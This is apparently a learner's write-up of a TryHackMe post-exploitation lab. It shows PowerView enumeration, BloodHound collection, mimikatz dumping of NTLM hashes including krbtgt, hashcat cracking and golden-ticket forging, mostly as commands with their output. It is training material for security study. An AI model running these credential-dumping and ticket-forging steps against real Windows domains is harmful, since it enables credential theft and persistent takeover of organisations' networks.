# [Post-Exploitation Basics](https://tryhackme.com/room/postexploit)
Learn the basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom

6/23/22

## Summary:
- [Powerview](#powerview)
- [Bloodhound](#bloodhound)
- [Mimikatz](#mimikatz)
- [Golden ticket](#golden-ticket)

## Powerview
- First we can list active shares with `Invoke-ShareFinder` and exclude the standard ones

![image](https://user-images.githubusercontent.com/66894542/175456049-c618707b-b7d7-4cfc-86c8-a03f629a5691.png)

- We can get more information about the computers on the domain with `get-netcomputer` and filter down the content to get exactly what we want:

![image](https://user-images.githubusercontent.com/66894542/175456369-8e44bb0c-e51e-4c72-a683-9cc3685a62b6.png)

- We can also get more information about the domain users with `get-netuser`:

![image](https://user-images.githubusercontent.com/66894542/175456579-91721fdf-8193-438f-b69c-94d4b0220ca6.png)

## Bloodhound
`Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip`
```
-----------------------------------------------
Initializing SharpHound at 10:10 PM on 7/2/2022
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps
, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Conf
iguration,DC=CONTROLLER,DC=LOCAL
PS C:\Users\Administrator> [+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 72 MB RAM
Status: 66 objects finished (+66 8)/s -- Using 81 MB RAM
Enumeration finished in 00:00:00.8277381
Compressing data to C:\Users\Administrator\20220702221007_loot.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 10:10 PM on 7/2/2022! Happy Graphing!
```

Now we can transfer this file over to our machine with scp:
`scp administrator@10.10.181.226:20220702221007_loot.zip .`

Now we can run the prebuilt queries to see what we can find!

## Mimikatz
```
PS C:\Users\Administrator\Downloads> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )        
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )       
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/       

mimikatz # privilege::debug 
Privilege '20' OK 

mimikatz # lsadump::lsa /patch 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf 

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService 
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : 60f56c1191d1b4b46fb87e511563a3a6

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a

```
Now We can crack some hashes with hashcat! Let's crack machine1 password:

`hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt`

## Golden ticket
`lsadump::lsa /inject /name:krbtgt `
```
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 5508500012cc005cf7082a9a89ebdfdf
    LM   :
  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c
```
Now we can use this info to build the command for the golden ticket:

`kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500`
```
User      : Administrator 
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 7/2/2022 10:41:23 PM ; 6/29/2032 10:41:23 PM ; 6/29/2032 10:41:23 PM

-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

Now we have access to any machine in the domain!
